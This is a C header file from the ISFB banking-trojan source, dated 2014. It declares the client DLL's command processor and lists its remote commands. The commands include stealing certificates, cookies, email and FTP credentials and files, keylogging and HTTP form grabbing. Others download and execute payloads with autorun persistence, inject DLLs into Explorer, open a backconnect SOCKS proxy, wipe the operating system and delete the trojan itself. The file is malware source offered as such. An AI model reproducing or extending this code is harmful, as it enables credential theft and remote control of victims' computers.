//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: command.h
// $Revision: 383 $
// $Date: 2014-10-23 18:31:51 +0400 (Чт, 23 окт 2014) $
// description:
//	ISFB client DLL. Command-file processor.
//	Receives, processes and executes external commands.

// Grabbers mask for CommonGrabberThread()
#define		GMASK_MAIL			1
#define		GMASK_FTP			2
#define		GMASK_IMS			4


typedef struct _COMMAND_THREAD_CONTEXT
{
	PVOID	Function;	// command function
	PVOID	Parameter;	// parameter passed to the command function
	_TCHAR	Uid[];		// command ID, zero-terminated string
} COMMAND_THREAD_CONTEXT, *PCOMMAND_THREAD_CONTEXT;


WINERROR WINAPI WipeCookies(PVOID Context);
WINERROR CreateAndExecuteFile(PCHAR	Binary, ULONG Size, LPTSTR pParam, BOOL	Autorun);
WINERROR CreateAndLoadDll(PCHAR Binary, ULONG Size, BOOL bIsPlugin);
WINERROR StartSocks(PSOCKADDR_IN Addr);
WINERROR CommonGrabberThread(ULONG_PTR GrabMask);
WINERROR StopSocks(VOID);
WINERROR CmdSendAll(VOID);
WINERROR CmdGetKeylog(HANDLE hPipe);

BOOL ServerProcessCommand(HANDLE hPipe, ULONG MessageId, PCHAR Data, ULONG DataSize, LPTSTR pUid);


// Supported commands
//	GET_CERTS			- exports and sends system store certificates		
//	GET_COOKIES			- sends IE and FF cookies, and Flahs SOLs
//	CLR_COOKIES			- clears cookies and sols
//	GET_SYSINFO			- sends system information
//	KILL				- destroyes OS (requires administrator)
//	REBOOT				- reboots OS
//	GROUP=123			- changes client group ID
//	LOAD_EXE=URL		- downloads a file from the specified URL and executes it
//	LOAD_REG_EXE=URL	- downloads a file from the specified URL, registers it within Windows autorun and executes it
//	LOAD_UPDATE=URL		- downloads an update file from the specified URL and executes it
//	GET_LOG				- send client log to the server
//	SLEEP=n				- suspends processing commands for n milliseconds
//	SEND_ALL			- send all queued data immediately
//	SOCKS_START=IP:PORT	- start the SOCKS4/5 server, connect it to the backconnect-server at the specified IP and PORT
//  SOCKS_STOP			- stop the SOCKS4/5 server
//	GET_KEYLOG			- send keylog report
//  GET_MAIL			- send E-Mail grabber report
//	GET_FTP				- send FTP grabber report
//	GET_FILES=*.*		- search for and send files according to the specified mask
//	LOAD_DLL=URL[,URL]	- downloads a DLL-file(s) from the specified URL(s) and loads it(them) into the EXPLORER process
//							If there's a second URL specfied it seemed to be an URL of a 64-bit DLL.
//	LOAD_PLUGIN=URL[,URL] - downloads a plugin-DLL file{s} from the specified URL{s} and loads it(them) into the EXPLORER
//							as ISFB-plugin modules.
//	SELF_DELETE			- completely removes application from the system. Deletes all files and registry keys.
//	KNOCKER_START		- enables task requests from the Explorer.
//	KNOCKER_STOP		- disables task requests from the Explorer.
//	URL_BLOCK=URL		- blocks URLs according to the specified URL mask
//	URL_UNBLOCK=URL		- unblocks URLs with the specified mask, previously blocked by URL_BLOCK command
//	FORMS_ON			- enables HTTP form grabber (if _ALWAYS_HTTPS defined grabbing of HTTPs forms are always enabled)
//	FORMS_OFF			- disables HTTP form grabber
//	KEYLOG_ON			- enables keylog (if any)
//	KEYLOG_OFF			- disables keylog (if any)
//	LOAD_INI=URL		- downloads an INI-file from the specified URL. Saves this file within the registry and uses it instead 
//							of an attached one.
